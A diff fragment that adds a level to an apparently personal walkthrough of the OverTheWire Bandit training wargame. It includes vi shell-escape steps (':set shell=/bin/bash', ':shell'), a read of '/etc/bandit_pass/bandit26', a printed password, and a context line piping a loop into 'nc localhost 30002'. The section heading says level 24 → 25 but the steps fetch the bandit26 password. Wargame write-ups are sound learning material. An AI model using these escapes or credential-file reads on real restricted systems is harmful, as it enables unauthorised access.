@@ -377,5 +377,24 @@ done | nc localhost 30002 | grep -v Wrong
 SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
 ```
 
+## Level 24 → 25
+
+```text
+
+v visual mode
+```
+
+
+```bash
+small terminal
+v to visual mode
+:set shell=/bin/bash
+:shell
+cat /etc/bandit_pass/bandit26
+```
+
+```text
+jHdv2ELQhT22BkprMNDjybZDAkw1zeBJ
+```
 
 
